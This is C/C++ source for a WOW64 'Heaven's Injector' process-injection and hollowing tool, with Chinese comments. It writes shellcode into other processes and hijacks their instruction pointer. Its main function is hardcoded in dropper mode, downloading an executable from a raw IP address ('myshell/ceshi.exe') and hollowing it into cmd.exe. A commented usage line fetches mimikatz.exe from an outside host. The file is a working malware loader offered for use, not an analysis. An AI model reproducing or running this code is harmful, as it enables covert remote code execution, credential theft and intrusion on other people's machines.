// WOW64 Heaven's Injector in C/C++
// by aaaddress1@chroot.org
#include <stdio.h>
#include <vector>
#include <windows.h>
using namespace std;
#pragma warning(disable:4996)

#include "peb.h"
#include "shellcodify.h"
#include "http_download.h"

bool readBinFile(const wchar_t fileName[], char** bufPtr, DWORD& length) {
    if (FILE* fp = _wfopen(fileName, L"rb")) {
        fseek(fp, 0, SEEK_END);
        length = ftell(fp);
        *bufPtr = new char[length + 1];
        fseek(fp, 0, SEEK_SET);
        fread(*bufPtr, sizeof(char), length, fp);
        return true;
    }
    return false;
}

uint32_t getShadowContext32(HANDLE hProcess, uint32_t PEB) {
    uint32_t teb32 = PEB + 0x3000, teb64 = teb32 - 0x2000, ptrCtx = 0;
    //64的teb结构地址+1488=32位的teb结构地址   从这个进程的这个地址读取数据
    ReadProcessMemory(hProcess, (LPCVOID)(teb64 + 0x1488), &ptrCtx, sizeof(ptrCtx), 0);
    return ptrCtx + 4;
}

// Hollowing函数用于创建进程并进行空壳注入
// 参数：
//   - path: 要启动的进程的路径
//   - shellcode: 要注入的Shellcode
//   - shellcodeSize: Shellcode的大小
void hollowing(const PWSTR path, const BYTE* shellcode, DWORD shellcodeSize) {
    // 存储处理后的路径
    wchar_t pathRes[MAX_PATH] = { 0 };

    // 存储进程信息和启动信息
    PROCESS_INFORMATION PI = { 0 };
    STARTUPINFOW SI = { 0 };
    //隐藏新进程窗口
    //SI.cb = sizeof(STARTUPINFO);
    //SI.dwFlags = STARTF_USESHOWWINDOW; // 使用 wShowWindow 字段
    //SI.wShowWindow = SW_HIDE;          // 隐藏窗口

    // 存储线程上下文信息
    CONTEXT CTX = { 0 };

    // 复制路径以防止更改原始路径
    memcpy(pathRes, path, sizeof(pathRes));
   
    // 创建新进程
    CreateProcessW(pathRes, NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &SI, &PI);

    // 在远程进程中分配内存以存储Shellcode
    size_t shellcodeAddr = (size_t)VirtualAllocEx(PI.hProcess, 0, shellcodeSize, 0x3000, PAGE_EXECUTE_READWRITE);

    // 将Shellcode写入远程进程的内存中
    WriteProcessMemory(PI.hProcess, (void*)shellcodeAddr, shellcode, shellcodeSize, 0);

    // 获取线程上下文信息
    CTX.ContextFlags = CONTEXT_FULL;
    GetThreadContext(PI.hThread, (&CTX));

    // 通过调用getShadowContext32获取远程进程的上下文信息
    uint32_t remoteContext = getShadowContext32(PI.hProcess, CTX.Ebx);

    // 将Shellcode的地址写入远程进程的Eip寄存器中
    WriteProcessMemory(PI.hProcess, LPVOID(remoteContext + offsetof(CONTEXT, Eip)), LPVOID(&shellcodeAddr), 4, 0);

    // 等待进程结束
     WaitForSingleObject(PI.hProcess, INFINITE);

}

// 在指定进程中注入 shellcode
void inject(WORD pid, const BYTE* shellcode, DWORD shellcodeSize) {
    // 打开目标进程，获取句柄
    auto hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

    // 在目标进程中分配内存空间，用于存放 shellcode
    size_t shellcodeAddr = (size_t)VirtualAllocEx(hProc, 0, shellcodeSize, 0x3000, PAGE_EXECUTE_READWRITE);

    // 将 shellcode 写入目标进程的分配内存中
    WriteProcessMemory(hProc, (void*)shellcodeAddr, shellcode, shellcodeSize, 0);

    // 打印 shellcode 在目标进程中的地址
    wprintf(L"[+] shellcode current at %x\n", shellcodeAddr);

    // 获取目标进程的 PEB (Process Environment Block) 信息
    auto peb = (PROCESS_BASIC_INFORMATION*)QueryProcessInformation(hProc, 0, sizeof(PROCESS_BASIC_INFORMATION));

    // 获取目标进程的 Shadow Context（在32位进程中）
    auto k = getShadowContext32(hProc, (uint32_t)peb->PebBaseAddress) + offsetof(CONTEXT, Eip);

    // 将 shellcode 在目标进程中的地址写入目标进程的 EIP 寄存器
    WriteProcessMemory(hProc, LPVOID(k), LPVOID(&shellcodeAddr), 4, 0);
}

#include <iostream>

int main() {
    // 使用当前时间作为随机数种子
    std::srand(static_cast<unsigned>(std::time(nullptr)));

    // 生成随机数
    int randomValue = std::rand();

    // 在代码中使用随机数
    std::cout << "Random value: " << randomValue << std::endl;
    // 你可以在这里设置你的参数值
  //  wchar_t* myArgv[] = { L"program_name", L"injection", L"C:/your_payload.exe", L"1234" };
    wchar_t myBuffer1[] = L"program_name";
    wchar_t myBuffer2[] = L"dropper";
    wchar_t myBuffer3[] = L"http://129.204.45.159:8099/myshell/ceshi.exe";
    wchar_t myBuffer4[] = L"C:/Windows/SySWOW64/cmd.exe";

    wchar_t* myArgv[] = { myBuffer1, myBuffer2, myBuffer3, myBuffer4 };

    int myArgc = sizeof(myArgv) / sizeof(myArgv[0]);

    //// 检查命令行参数是否足够
    //if (myArgc < 3) {
    //    wprintf(L"WOW64 注入器 - 利用 WOW64 层进行注入，作者：aaaddress1@chroot.org\n");
    //    wprintf(L"用法: ./wowInjector [选项] [载荷] [目标]\n");
    //    wprintf(L"  -- \n");

    //    wprintf(L"  示例#1 ./wowInjector injection  C:/msgbox.exe [PID]\n");
    //    wprintf(L"  示例#2 ./wowInjector hollowing  C:/msgbox.exe C:/Windows/SysWOW64/notepad.exe\n");
    //    wprintf(L"  示例#3 ./wowInjector dropper    http://30cm.tw/mimikatz.exe C:/Windows/SySWOW64/cmd.exe\n");
    //    wprintf(L"\n");
    //    return 0;
    //}

    // 根据命令行参数确定操作模式
    bool mode_Dropper = !wcsicmp(myArgv[1], L"dropper"),
        mode_Inject = !wcsicmp(myArgv[1], L"injection"),
        mode_Hollowing = !wcsicmp(myArgv[1], L"hollowing");

    PCHAR ptrToExe(0), ptrToShc(0);
    DWORD lenExe, lenShc;

    // 读取或下载载荷文件
    if (mode_Inject || mode_Hollowing) {
        wprintf(L"[?] 从 %s 读取载荷\n", myArgv[2]);
        if (readBinFile(myArgv[2], &ptrToExe, lenExe))
            wprintf(L"[v] 读取源可执行文件成功.\n");
        else
            wprintf(L"[x] 读取源可执行文件失败.\n");
    }
    else if (mode_Dropper) {
        wprintf(L"[?] 从 %s 下载载荷\n", myArgv[2]);
        auto binPayload = httpRecv(myArgv[2]);
        lenExe = binPayload->size();
        ptrToExe = &(*binPayload)[0];
    }
    else
        wprintf(L"[x] 获取载荷失败？\n");

    // 将可执行文件转换为 shellcode
    if (ptrToShc = shellcodify(ptrToExe, lenExe, lenShc))
        wprintf(L"[v] 准备载荷的 shellcode 成功.\n");
    else
        wprintf(L"[x] 将可执行文件转换为 shellcode 失败.\n");

    // 在这里设置你的参数值
    int myPid = 5678;

    // 根据操作模式执行相应的操作
    if (mode_Inject) {
        wprintf(L"[!] 进入注入模式...\n");
        int pid = myPid;
        wprintf(L"[$] 进程注入 [pid = %i]\n", pid);
        inject(pid, (PBYTE)ptrToShc, lenShc);
    }
    else if (mode_Hollowing) {
        wprintf(L"[!] 进入空壳模式...\n");
        wprintf(L"[$] 进程空壳化: %s\n", myArgv[2]);
        hollowing(myArgv[3], (PBYTE)ptrToShc, lenShc);
    }
    else if (mode_Dropper) {
        wprintf(L"[!] 进入下载器模式...\n");
        hollowing(myArgv[3], (PBYTE)ptrToShc, lenShc);
    }
    else
        wprintf(L"[!] 未知操作？\n");

    wprintf(L"\n完成.");
    return 0;
}
